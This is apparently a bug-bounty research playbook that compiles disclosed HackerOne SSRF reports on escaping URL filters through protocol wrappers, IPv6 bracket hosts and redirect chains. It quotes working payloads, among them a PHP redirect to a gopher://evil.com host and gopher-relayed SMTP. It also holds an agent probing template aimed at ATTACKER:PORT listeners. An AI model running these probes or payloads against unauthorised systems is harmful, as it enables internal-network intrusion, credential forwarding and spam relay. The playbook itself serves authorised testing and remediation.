---
title: "Validation Bypass & Scheme Abuse (SSRF gate escape)"
type: playbook
category: url-validation-bypass
cwe: "CWE-918"
source_count: 6
full_bodies_available: 6
corpus: "HackerOne disclosed reports, 2013–2017 era, h1.security.nathan.sx archive"
archive_accessed: "2026-10-24"
note: "All quotes read from full bodies this session. Bounty figures are those recorded on the reports."
---

# Validation Bypass & Scheme Abuse (SSRF gate escape)

## 1. Overview

This file holds the corpus cases whose essence is *escaping the URL gate* — where a
target already knows that "fetching attacker URLs is dangerous" and applies some
filter, and the finding is that the filter misses. Three distinct gate families are
evidenced:

1. **No port whitelist and no scheme whitelist** — `libcurl`-style clients left on
   defaults accept protocol wrappers (`dict://`, `gopher://`, `ldap://`, `telnet://`,
   `pop3://`, `ftp://`, `scp://`, `sftp://`, `imap://`, `smtp://`, `tftp://`).
   Anchors: SRF-14127, SRF-115748; entry-level statement: SRF-91816.
2. **IP denylist gaps** — loopback/`10.0.0.0/8`-style denylists that miss IPv6
   bracket notation (`http://[::]:25/`). Anchor: SRF-61312.
3. **Redirect-content blindness** — the gate inspects the *first leg* of a request;
   the redirect target (second leg) carries anything: any port, `Authorization`
   headers, gopher payloads, FTP passive sessions. Anchors: SRF-204513,
   SRF-228377; first-leg-only filter observed at Shopify (SRF-67389, see the
   Port-Scan playbook), SRF-115748's authors explicitly used a 302 to carry a
   gopher payload.

A baseline anchor frames the family: **SRF-91816** (`#91816`, Imgur `vidgif/url`)
strings the whole thing together before the deeper findings existed on the same
endpoint — "it fails to sanitize or verify the `url` GET parameter" — with internal
LAN and third-party abuse named. `SRF-115748` is that same endpoint *five months
later*, upgraded to a full wrapper matrix; SRF-178184 (Port-Scan playbook) shows a
reverted fix in 2017. Follow the endpoint across time — the family's history is the
pattern.

## 2. Case evidence

### SRF-14127 — SSRF on https://whitehataudit.slack.com/account/photo · Slack — **$300** (archive-stated)

- Link: <https://hackerone.com/reports/14127>
- Weakness label as recorded (historical): "Command Injection - Generic" — mislabel
  of its time; body is a scheme/protocol-wrapper escape.
- Sink: `POST /account/photo`, parameter `url` — the screenshot shows the
  submitted body held `&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg`.
- Quote (the core claim):
  > We got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):
- Wrapper transcripts shown in the report and their observable client traces:
  > gopher → `Connection from 54.197.108.234 port 6655 [tcp/*] accepted` … `icture-54679.jpg` *(the transcript shows a truncated 'p' — "icture"; that is how the source reads)*
  > dict → `CLIENT libcurl 7.22.0` … `picture-54679.jpg` … `QUIT`
  > ldap → `0`
  > telnet → (empty on connect)
  > pop3 → `QUIT`
- Quote (the author's escalation note, timing-attack named like the Port-Scan file):
  > It's possible to use it to port scanning (using timing).
- Cited methodology link in the source: a public Google Doc on SSRF
  (`https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit`) — now recovered and quoted in [BLOG-002](references/blogs-index.md): it is the era's **"SSRF bible. Cheatsheet"** (Wallarm, Revision 1.03 of 26 Jan 2017 — the revision SRF-14127 cited in 2014 is not recoverable from the URL).

### SRF-115748 — SSRF in https://imgur.com/vidgif/url · Imgur — **$2,000** (archive-stated; era's largest confirmed payout in this corpus)

- Link: <https://hackerone.com/reports/115748>
- Weakness label as recorded (historical): "Uncontrolled Resource Consumption" —
  mislabel again; the body is a full wrapper matrix.
- Quote (root cause):
  > imgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length.
- Quote (the client configuration problem, naming libcurl):
  > It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and imgur will make such a FTP request.
- Quote (the working protocol list, verbatim):
  > * SSH (scp://, sftp://)
  > * POP3
  > * IMAP
  > * SMTP
  > * FTP
  > * DICT
  > * GOPHER
  > * TFTP
- Version disclosure reads (first-leg list "SSH banner" oracle):
  > SSH-2.0-libssh2_1.4.2
  and
  > CLIENT libcurl 7.40.0
  followed by the author's hedged CVE linkage:
  > imgur leaks information about installed software versions via SSH and DICT protocols.

  > This way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs. *(sic — "All there are")*
  Keep the hedge words ("probably") in any reproduction; do not present the CVE
  pairing as verified in the source.
- Quote (gopher newline trick — newlines cannot be in the *first-leg* URL param,
  so the trick relays a crafted payload through a redirect):
  > Unfortunately imgur filters GET['url'] and does not allow us to include newlines in the request, however, imgur's libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.
  Crafted page, verbatim:
  > `<?php header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest'); ?>`
  and the received session:
  > HI
  > Multiline
  > test
- Quote (real SMTP over gopher — the era's strongest "your server spoke a
  non-HTTP protocol" proof; the author actually generating mail):
  > This code concats our SMTP command into one line delimited by %0A and forces imgur server to send a 'GOPHER' request to a SMTP server while actually sending a **valid SMTP request**
  closing with: "Cool, now we can send spam from imgur servers :)" and
  > Same method can be used to connect to, say, REDIS servers, unavailable from external network.
- Quote (UDP reach through TFTP):
  > We can send almost arbitrary UDP packets by using TFTP protocol, here is an example:
  … receiving:
  > TESTUDPPACKEToctettsize0blksize512timeout6
- Quote (the UDP target list evidence):
  > This can be used to craft request to various UDP-services like Memcache or REDIS-UDP.
- DoS-side observation (suffix, not the main class):
  > An attacker can send all TCP traffic to port 12345 to TARPIT and the request … In this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10's of seconds).

### SRF-61312 — Bypass of the SSRF protection (Slack commands, Phabricator integration) · Slack — **$100**

- Link: <https://hackerone.com/reports/61312>
- Weakness label as recorded: "None".
- Quote (the class in one sentence):
  > A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, ...). This blacklist can be bypassed using "[::]" as the hostname. Only services binding all the interfaces and supporting IPv6 can be reached using that vector.
- Quote (the live readback, port 25 on loopback, response body inside a JSON reply):
  > Access port TCP/25 on loopback
  > `{"ok":true,"response":"220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0 Error: I can break rules, too. Goodbye.\r\n"}`
- A second integration on the same program (Phabricator) reproduces the effect with
  a *status-code* oracle instead:
  > If the port is opened, a HTTP 302 code is received. If not, an error 500 is generated. Outside of that, this vector is blind.
- Services identified through the session, verbatim structure (code lines kept):
  > SSH on TCP/22
  > `SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4` / `Protocol mismatch.`
  > SMTP on TCP/25
  > `220 squid3.tinyspeck.com ESMTP Postfix` / `221 2.7.0 Error: I can break rules, too. Goodbye.`
  > Squid on TCP/3128 — the retrieved page is Squid's own error page naming its version (`squid/3.1.19`) in the footer line `Generated Mon, 11 May 2015 20:34:46 GMT by localhost (squid\/3.1.19)`

### SRF-204513 — Infrastructure - Photon - SSRF · WordPress.com — **$350** (archive-stated)

- Link: <https://hackerone.com/reports/204513>
- Weakness label as recorded: "Server-Side Request Forgery (SSRF)".
- Quote (the service and the bug's shape):
  > The service Photon located at `http://i0.wp.com/` and described at `https://code.trac.wordpress.org/browser/photon/` is vulnerable to Http SSRF via. redirect. *(sic — "via. redirect")*
  > The redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.
- The existing guard, quoted from the referenced source-line (`index.php#L111`):
  > curl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );
  > But this does not guard against internal IP's, auth redirects nor other port attacks via http/https. *(sic — "IP's")*
- The port gate and its bypass:
  > **First a demo that the service does not allow firing requests to any port.**
  > Goto `http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1`
  > The responds `Sorry, the parameters you provided were not valid` *(sic — "The responds")*
  > **Now a demo of bypassing the port restriction and appending authorization headers.**
  > Goto `http://i0.wp.com/159.203.190.123/new.php?resize=0,2`
  … and the outbound redirect-target readback:
  > GET / HTTP/1.1
  > Host: 159.203.190.123:666
  > Authorization: Basic YWRtaW46YWRtaW4=
  > User-Agent: Photon/1.0
  > Accept: */*
  (from the crafted redirect page: `header('Location: http://[REDACTED_CREDS]@159.203.190.123:666');` —
  the credential comes from userinfo injection, not a header the client "decided" to send.)
- Cache-busting lesson embedded in the PoC (upload-line commentary):
  > *Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param*
- Remediation quotes, verbatim:
  > I would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria. *(sic — "if the validates")*
  > Also consider using `curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );` atm. the link is vuln to MITM attack as the certs are not verified. *(sic — "atm.")*

### SRF-228377 — SSRF in upload IMG through URL · Discourse — **$64**

- Link: <https://hackerone.com/reports/228377>
- Weakness label as recorded: "Information Disclosure".
- Quote (the class — gopher AND ftp both proven live via Ruby's client):
  > Private message function is vulnerable is vulnerable to a SSRF vulnerability *(sic — doubled wording)* which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse) *(sic — extra spacing)*
- Chain (7 attacker steps in the source) — the redirect payload, verbatim:
  > 5. Set the malicious3.php file on your remote server to:
  > `<?php header('Location: gopher://192.166.218.53:80/test123'); ?>`
- Readback evidence (the gopher payload land on the target port as a plain request):
  > 64.71.168.198 - - [14/May/2017:16:38:04 -0400] "HEAD /test123 HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"
- FTP leg, verbatim:
  > `header('Location: ftp://192.166.218.53/');`
  > Sun May 14 15:29:40 2017 [pid 18354] CONNECT: Client "::ffff:64.71.168.198"
- Root-cause statement:
  > discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request. *(sic — "various  protocol" extra spaces)*
- Burp evidence in source: the `raw=TESTa [IMG]` message body, and the report notes
  "the attacker is able to send internal server side requests using Ruby client."

### SRF-91816 — Server Side Request Forgery In Video to GIF Functionality · Imgur — **$1,600** (archive-stated)

- Link: <https://hackerone.com/reports/91816>
- Weakness label as recorded (historical): "Cross-Site Request Forgery (CSRF)" —
  mislabelling of its era; the body is wholly SSRF.
- Quote (the open gate — the family's baseline):
  > imgur.com is vulnerable to Server Side Request Forgery because it fails to sanitize or verify the "url" GET parameter.
- Quote (the internal-set claim, which the later Imgur reports make precise):
  > since the requests originate from the server, it may also be possible to make requests to the internal corporate LAN by making the server request internal sites like: http://192.168.1.1, etc... making these requests over and over again would cause a small DoS attack possibly.
- Recommendation line (era style): "the application should first check to see if the URL specified is a valid image extension before sending the actual GET request to the remote site."
- Family chronology note: the *same* endpoint re-appeared in SRF-115748
  (Feb 2016) with the wrapper matrix — evidence that a fix-instead-of-gate
  observation is a continuing theme on the program (also seen reverted at Twitter,
  Port-Scan file SRF-178184).

## 3. Cross-case anatomy

| Gate family | Case | Gate observed | Escape shown |
| --- | --- | --- | --- |
| Scheme/port whitelist (libcurl defaults) | SRF-14127 | none on ports; wrappers open | dict:// / gopher:// names hit on demand |
| Same (deeper matrix) | SRF-115748 | scheme filters ~absent; newlines in the GET param | 8 wrapper protocols; 302-relayed gopher payload |
| IP denylist | SRF-61312 | loopback + RFC1918 textual denylist | `[::]` bracket host |
| Redirect leg inspection | SRF-204513 | port filtering on the first-leg URL; redirect protocol filter | second leg gets any port + userinfo creds |
| Redirect leg inspection (Ruby) | SRF-228377 | image-extension/type check on first leg | 302 → `gopher://` and `ftp://` |
| Raw gate missing | SRF-91816 | none | straight SSRF to server-side proxy |

Design lesson in evidence terms: every ship-shape guard in the corpus was checked
on the *first* hop only, and every escape changed either the scheme of the URL or
hopped through a redirect that no inspector read. Filter code must re-validate per
leg or the wrapper list must be pinned in the client.

## 4. Agent execution template

### Context V1 — scheme inventory probe

For any confirmed URL sink (ports/hosts/paths otherwise clean):

1. Probe set (never more than one request per scheme per session unless separately
   authorised): `dict://ATTACKER:PORT/x` (banner readback), `gopher://ATTACKER:PORT/`,
   `ldap://ATTACKER:PORT/x`, `telnet://ATTACKER:PORT`, `pop3://ATTACKER:PORT/`,
   `scp://ATTACKER:PORT/`, `sftp://ATTACKER:PORT/`, `imap://ATTACKER:PORT/`,
   `smtp://ATTACKER:PORT/`, `ftp://ATTACKER:PORT/`, `tftp://ATTACKER:PORT/x`.
2. Serve each with a netcat listener on the port you created and record which client
   fingerprint appears (`CLIENT libcurl …`, SSH banner, QUIT, keep the transcripts —
   SRF-14127 and SRF-115748 are the model).
3. Version-fingerprint results are reported as read; keep author-style hedges on CVE
   pairing unless the target itself verifies (`SRF-115748` "probably …" wording is
   the vault's citation standard for this).

### Context V2 — first-leg-blind-the-second-leg (redirect relay)

1. Identify the gate's inspection scope by probing a URL where the *first leg* is
   server-controlled-legal (e.g. http to your host, port 80) while the *second leg*
   (redirect) targets: internal port, other scheme, user-info credentials.
2. Redirect targets to test, in order of the corpus's proven value:
   - `Location: gopher://ATTACKER:PORT/_LINE%0A...` (SRF-115748, SRF-228377)
   - `Location: ftp://ATTACKER:PORT/` (SRF-228377)
   - `Location: http://[REDACTED_CREDS]@INTERNAL:PORT/` — userinfo-relayed `Authorization`
     header injection (SRF-204513)
3. Evidence standard: a listener transcript (netcat/vsftpd) + the request line that
   came in on the second leg, with the UA shown. Never conclude scheme support from
   silence.
4. Cache-busting courtesy of SRF-204513's commentary: vary a parameter per attempt
   to defeat sticky caches; record each variant you used.

### Context V3 — denylist notation gaps

1. With a confirmed scheme-legal but hostname-restricted sink, attempt hosts in
   turn: `localhost`, `127.0.0.1`, RFC1918 literals (as permitted by target scope
   guidance), `0.0.0.0` (also seen in Port-Scan file SRF-178184/SRF-110801), hex
   shorthand (`0x7f.1`, SRF-128685 metadata file), IPv6 bracket notations — and keep
   `[::]` last: reaching wildcard-bound services depends on the service actually
   binding all interfaces and IPv6 capability, as SRF-61312 states. Never infer
   it before seeing a readback.
2. When a probe answers (SMTP/SSH/Squid-style banner in an error or reply), pin down
   the base service and quote its line.

### Context V4 — proxy/relay re-abuse (Photon lines)

Any CDN-resize / media-proxy / "fetch remote image and transform" service where
your URL parameter is fetched server-side: build the redirect leg with credentials
(SRF-204513) and confirm the outbound request carries them; the readback transcript
is the entire PoC. Impact framing per source: internal reach + forwarded credentials.

## 5. Validation gates

1. Every wrapper claim needs the server receipt (connection transcript with the
   client fingerprint); "the library supports X" is documentation, not evidence.
2. Multi-leg techniques need both legs recorded (302 sent by you — accepted by
   target — inbound trace at the second hop).
3. Credential-injection claims must show the exact `Authorization`/userinfo bytes
   landing on the second-leg server (SRF-204513's readback).
4. IPv6 bracket claims must note the service-binding caveat (SRF-61312's own
   sentence) and rely on an observed reply, not on port-scan inference.
5. Version/CVE claims carry their hedge words into the report.
6. Rate and non-impact notes: SRF-91816's DoS suggestion came *with a "possibly"* —
   preserve uncertainty in impact language; don't restate it as fact.

## 6. Remediation quotes straight from the corpus

- Pin the scheme list client-side: SRF-204513's `CURLOPT_REDIR_PROTOCOLS` was present
  but insufficient — "But this does not guard against internal IP's, auth redirects
  nor other port attacks via http/https."
- Read redirects manually and gate every leg: SRF-204513's "doing 1 request at a
  time, manually parsing the response...".
- SRF-14127-era conclusion "NOT disabled wrappers" is the whole-fix case: wrappers
  must be disabled by allowlisting schemes instead.
- SRF-115748's structural recommendation is absent from the report, i.e. **"Not
  disclosed in the source"** — do not fill it from memory in quotes.

## 7. Archive-era labels

| Case | Label recorded | True class in the body |
| --- | --- | --- |
| SRF-14127 | Command Injection - Generic | scheme/wrapper escape |
| SRF-115748 | Uncontrolled Resource Consumption | scheme/wrapper escape + UDP reach |
| SRF-61312 | None | IP denylist bypass |
| SRF-204513 | Server-Side Request Forgery (SSRF) | redirect-leg bypass |
| SRF-228377 | Information Disclosure | redirect-to-scheme Ruby escape |
| SRF-91816 | Cross-Site Request Forgery (CSRF) | plain SSRF via GET param |

Labels are historical; the class attribution above comes from bodies read in full.
